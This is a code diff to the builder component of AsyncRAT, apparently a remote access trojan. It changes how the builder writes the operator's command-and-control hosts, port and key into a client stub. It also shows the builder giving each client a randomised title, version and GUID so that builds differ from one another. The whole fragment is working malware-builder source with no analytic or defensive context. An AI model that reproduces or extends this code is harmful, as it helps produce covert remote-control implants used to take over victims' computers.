@@ -13,8 +13,10 @@ Public Class Builder
             .FileName = "AsyncRAT-Client"
             }
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                Stub = Replace(Stub, "#Const VS = True", "#Const VS = False")
+
                 Stub = Replace(Stub, "%HOSTS%", TextBox1.Text.Trim().Replace(",", ChrW(34) + "," + ChrW(34)))
-                Stub = Replace(Stub, "123456789", TextBox2.Text)
+                Stub = Replace(Stub, "%PORT%", TextBox2.Text)
                 Stub = Replace(Stub, "%KEY%", Settings.KEY)
 
                 Stub = Replace(Stub, "%Title%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
@@ -28,7 +30,6 @@ Public Class Builder
                 Stub = Replace(Stub, "%v3%", rand.Next(0, 10))
                 Stub = Replace(Stub, "%v4%", rand.Next(0, 10))
                 Stub = Replace(Stub, "%Guid%", Guid.NewGuid.ToString)
-                Stub = Replace(Stub, "'%ASSEMBLY%", Nothing)
 
                 Dim providerOptions = New Dictionary(Of String, String)
                 providerOptions.Add("CompilerVersion", "v4.0")
